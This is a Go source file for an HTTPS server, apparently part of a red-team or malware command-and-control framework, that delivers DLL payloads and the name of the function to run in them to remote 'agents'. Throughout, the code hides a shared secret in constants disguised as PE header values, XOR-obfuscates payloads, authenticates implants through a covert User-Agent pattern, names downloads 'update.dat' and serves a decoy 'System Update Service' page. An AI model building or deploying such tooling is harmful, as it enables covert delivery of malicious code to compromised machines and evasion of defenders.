// Package https_server implements a secure HTTPS server for delivering payloads to agents
package https_server

import (
	"crypto/tls"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"regexp"
	"strconv"
	"sync"
	"time"
	//"goMESA/internal/common" // For shared types and constants
)

// PayloadMetadata represents additional data embedded with a payload
type PayloadMetadata struct {
	FunctionName string `json:"function_name"` // Name of the function to execute in the DLL
}

// HTTPSServer represents an HTTPS server for delivering payloads to agents
type HTTPSServer struct {
	certPath     string                     // Path to the TLS certificate
	keyPath      string                     // Path to the TLS private key
	listenAddr   string                     // Address:port to listen on
	server       *http.Server               // The actual HTTP server
	payloads     map[string][]byte          // Map of payload ID to payload data
	metadata     map[string]PayloadMetadata // Map of payload ID to metadata
	payloadMutex sync.RWMutex               // Mutex for concurrent access to payloads
	running      bool                       // Flag indicating if the server is running
}

// NewHTTPSServer creates a new HTTPS server
func NewHTTPSServer(certPath, keyPath, listenAddr string) *HTTPSServer {
	return &HTTPSServer{
		certPath:   certPath,
		keyPath:    keyPath,
		listenAddr: listenAddr,
		payloads:   make(map[string][]byte),
		metadata:   make(map[string]PayloadMetadata),
		running:    false,
	}
}

// -------------------------------------------------------------------------
// Key Derivation and Obfuscation Functions
// -------------------------------------------------------------------------

// These constants are used to derive the shared secret key
const (
	SECTION_ALIGN_REQUIRED    = 0x53616D70 // "Samp" in ASCII
	FILE_ALIGN_MINIMAL        = 0x6C652D6B // "le-k" in ASCII
	PE_BASE_ALIGNMENT         = 0x65792D76 // "ey-v" in ASCII
	IMAGE_SUBSYSTEM_ALIGNMENT = 0x616C7565 // "alue" in ASCII
	PE_CHECKSUM_SEED          = 0x67891011
)

// getPESectionAlignmentString constructs part of our shared secret
func getPESectionAlignmentString() string {
	buffer := make([]byte, 16)
	binary.LittleEndian.PutUint32(buffer[0:4], SECTION_ALIGN_REQUIRED)
	binary.LittleEndian.PutUint32(buffer[4:8], FILE_ALIGN_MINIMAL)
	binary.LittleEndian.PutUint32(buffer[8:12], PE_BASE_ALIGNMENT)
	binary.LittleEndian.PutUint32(buffer[12:16], IMAGE_SUBSYSTEM_ALIGNMENT)
	return string(buffer)
}

// verifyPEChecksumValue constructs the second part of our shared secret
func verifyPEChecksumValue(seed uint32) string {
	result := make([]byte, 4)
	checksum := seed
	for i := 0; i < 4; i++ {
		checksum = ((checksum << 3) | (checksum >> 29)) ^ uint32(i*0x37)
		result[i] = byte(checksum & 0xFF)
	}
	return string(result)
}

// generateSharedSecret generates the shared secret key
func generateSharedSecret() string {
	alignmentSignature := getPESectionAlignmentString()
	checksumSignature := verifyPEChecksumValue(PE_CHECKSUM_SEED)
	result := alignmentSignature + checksumSignature
	log.Printf("SERVER-KEY-DEBUG: Generated shared secret: % x", []byte(result))
	return alignmentSignature + checksumSignature
}

// deriveKeyFromParams derives an encryption key from request parameters
func deriveKeyFromParams(timestamp, clientID string, sharedSecret string) string {
	combined := sharedSecret + timestamp + clientID
	key := make([]byte, 32)
	for i := 0; i < 32; i++ {
		if i < len(combined) {
			key[i] = combined[i]
		} else {
			key[i] = combined[i%len(combined)]
		}
	}
	return string(key)
}

// obfuscatePayload obfuscates the payload using XOR with a rolling key
func obfuscatePayload(data []byte, key string, metadata PayloadMetadata) []byte {
	// Convert metadata to JSON
	metadataBytes, err := json.Marshal(metadata)
	if err != nil {
		log.Printf("Error marshaling metadata: %v", err)
		metadataBytes = []byte("{}")
	}

	log.Printf("SERVER-PAYLOAD-DEBUG-1: Metadata JSON before obfuscation: %s", string(metadataBytes))
	log.Printf("SERVER-PAYLOAD-DEBUG-2: Derived encryption key: %q", key)
	log.Printf("SERVER-PAYLOAD-DEBUG-3: Metadata length: %d bytes", len(metadataBytes))

	// Format: [4-byte metadata length][metadata JSON][payload data]
	metadataLen := uint32(len(metadataBytes))
	result := make([]byte, 4+len(metadataBytes)+len(data))

	// Write metadata length as first 4 bytes
	binary.LittleEndian.PutUint32(result[0:4], metadataLen)

	log.Printf("SERVER-PAYLOAD-DEBUG-4: First 32 bytes of payload: % x", result[:min(32, len(result))])

	// Copy metadata bytes
	copy(result[4:4+metadataLen], metadataBytes)

	// Copy and obfuscate payload
	keyBytes := []byte(key)
	keyLen := len(keyBytes)

	// Obfuscate the entire result (metadata + payload)
	for i := 0; i < len(result); i++ {
		if i < 4 {
			// Leave the length field unobfuscated for easier processing
			continue
		}
		// Calculate rolling key byte: combines key byte with position
		keyByte := keyBytes[i%keyLen] ^ byte(i&0xFF)

		if i < 4+int(metadataLen) {
			// Obfuscate metadata
			result[i] = metadataBytes[i-4] ^ keyByte
		} else {
			// Obfuscate payload
			result[i] = data[i-(4+int(metadataLen))] ^ keyByte
		}
	}

	return result
}

// extractClientInfo extracts timestamp and client ID from User-Agent
func extractClientInfo(userAgent string) (string, string, error) {
	// Look for pattern: rv:TIMESTAMP-CLIENTID
	re := regexp.MustCompile(`rv:(\d+)-([A-Za-z0-9_-]+)`)
	matches := re.FindStringSubmatch(userAgent)

	if len(matches) != 3 {
		return "", "", fmt.Errorf("invalid User-Agent format")
	}

	return matches[1], matches[2], nil
}

// authenticateClient verifies the client is legitimate
func authenticateClient(timestamp, clientID string) bool {
	// Parse timestamp
	ts, err := strconv.ParseInt(timestamp, 10, 64)
	if err != nil {
		log.Printf("Invalid timestamp format: %s", timestamp)
		return false
	}

	// Check timestamp is within a reasonable window (30 minutes)
	now := time.Now().Unix()
	if now-ts > 1800 || ts-now > 1800 {
		log.Printf("Timestamp out of acceptable range: %s", timestamp)
		return false
	}

	// Check client ID format
	clientIDPattern := regexp.MustCompile(`^[A-Za-z0-9_-]{5,}$`)
	if !clientIDPattern.MatchString(clientID) {
		log.Printf("Invalid client ID format: %s", clientID)
		return false
	}

	return true
}

// handlePayloadRequest processes payload delivery requests
func (s *HTTPSServer) handlePayloadRequest(w http.ResponseWriter, r *http.Request) {
	clientIP := r.RemoteAddr
	log.Printf("HTTPS: Incoming request from %s", clientIP)

	// Extract payload ID from path
	payloadID := r.URL.Query().Get("id")
	if payloadID == "" {
		log.Printf("HTTPS: No payload ID provided from %s", clientIP)
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}

	// Extract User-Agent
	userAgent := r.Header.Get("User-Agent")
	if userAgent == "" {
		log.Printf("HTTPS: No User-Agent provided from %s", clientIP)
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}

	// Extract client info from User-Agent
	timestamp, clientID, err := extractClientInfo(userAgent)
	if err != nil {
		log.Printf("HTTPS: Failed to extract client info from %s: %v", clientIP, err)
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}

	log.Printf("HTTPS: Client info - Timestamp: %s, ClientID: %s, PayloadID: %s", timestamp, clientID, payloadID)

	// Authenticate client
	if !authenticateClient(timestamp, clientID) {
		log.Printf("HTTPS: Authentication failed for client %s from %s", clientID, clientIP)
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	// Get payload data
	s.payloadMutex.RLock()
	payload, ok := s.payloads[payloadID]
	metadata, metadataOk := s.metadata[payloadID]
	s.payloadMutex.RUnlock()

	if !ok || !metadataOk {
		log.Printf("HTTPS: Payload ID %s not found", payloadID)
		http.Error(w, "Not Found", http.StatusNotFound)
		return
	}

	// Generate shared secret
	sharedSecret := generateSharedSecret()

	// Derive encryption key
	encryptionKey := deriveKeyFromParams(timestamp, clientID, sharedSecret)

	// Obfuscate the payload with metadata
	obfuscatedPayload := obfuscatePayload(payload, encryptionKey, metadata)

	// Set response headers
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", "attachment; filename=update.dat")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(obfuscatedPayload)))

	// Send the obfuscated payload
	w.Write(obfuscatedPayload)

	log.Printf("HTTPS: Delivered %d bytes of obfuscated payload to %s (%s)",
		len(obfuscatedPayload), clientID, clientIP)
}

// handleDefault provides a generic response for all other paths
func (s *HTTPSServer) handleDefault(w http.ResponseWriter, r *http.Request) {
	clientIP := r.RemoteAddr
	log.Printf("HTTPS: Default handler: %s requested %s", clientIP, r.URL.Path)

	// Serve a generic system update page
	w.Header().Set("Content-Type", "text/html")
	w.Write([]byte(`
<!DOCTYPE html>
<html>
<head>
    <title>System Update Service</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .container { max-width: 800px; margin: 0 auto; }
        h1 { color: #333; }
    </style>
</head>
<body>
    <div class="container">
        <h1>System Update Service</h1>
        <p>This service provides automated system updates for authorized clients.</p>
        <p>Please ensure your client software is configured correctly to access this service.</p>
        <p>If you believe you've reached this page in error, please contact your system administrator.</p>
        <hr>
        <p><small>Build: 20230417-1</small></p>
    </div>
</body>
</html>
	`))
}

// RegisterPayload adds a new payload to the server
func (s *HTTPSServer) RegisterPayload(id string, data []byte, functionName string) string {
	s.payloadMutex.Lock()
	defer s.payloadMutex.Unlock()

	s.payloads[id] = data
	s.metadata[id] = PayloadMetadata{
		FunctionName: functionName,
	}

	log.Printf("HTTPS: Registered payload %s, size: %d bytes, function: %s",
		id, len(data), functionName)

	return id
}

// RemovePayload removes a payload from the server
func (s *HTTPSServer) RemovePayload(id string) {
	s.payloadMutex.Lock()
	defer s.payloadMutex.Unlock()

	delete(s.payloads, id)
	delete(s.metadata, id)
	log.Printf("HTTPS: Removed payload %s", id)
}

// Start starts the HTTPS server
func (s *HTTPSServer) Start() error {
	if s.running {
		return fmt.Errorf("HTTPS server already running")
	}

	// Verify TLS certificate and key exist
	if _, err := os.Stat(s.certPath); os.IsNotExist(err) {
		return fmt.Errorf("TLS certificate not found: %s", s.certPath)
	}
	if _, err := os.Stat(s.keyPath); os.IsNotExist(err) {
		return fmt.Errorf("TLS private key not found: %s", s.keyPath)
	}

	// Create TLS configuration
	tlsConfig := &tls.Config{
		MinVersion: tls.VersionTLS12,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
		},
		PreferServerCipherSuites: true,
	}

	// Setup HTTP server
	mux := http.NewServeMux()
	mux.HandleFunc("/update", s.handlePayloadRequest)
	mux.HandleFunc("/", s.handleDefault)

	s.server = &http.Server{
		Addr:         s.listenAddr,
		Handler:      mux,
		TLSConfig:    tlsConfig,
		ReadTimeout:  60 * time.Second,
		WriteTimeout: 60 * time.Second,
	}

	// Start the server in a goroutine
	go func() {
		log.Printf("HTTPS: Server starting on %s", s.listenAddr)
		err := s.server.ListenAndServeTLS(s.certPath, s.keyPath)
		if err != nil && err != http.ErrServerClosed {
			log.Printf("HTTPS: Server failed: %v", err)
		}
	}()

	s.running = true
	log.Printf("HTTPS: Server started successfully")
	return nil
}

// Stop stops the HTTPS server
func (s *HTTPSServer) Stop() error {
	if !s.running {
		return nil
	}

	log.Printf("HTTPS: Shutting down server...")
	err := s.server.Close()
	s.running = false
	return err
}

// GetListenAddr returns the server's listen address
func (s *HTTPSServer) GetListenAddr() string {
	return s.listenAddr
}
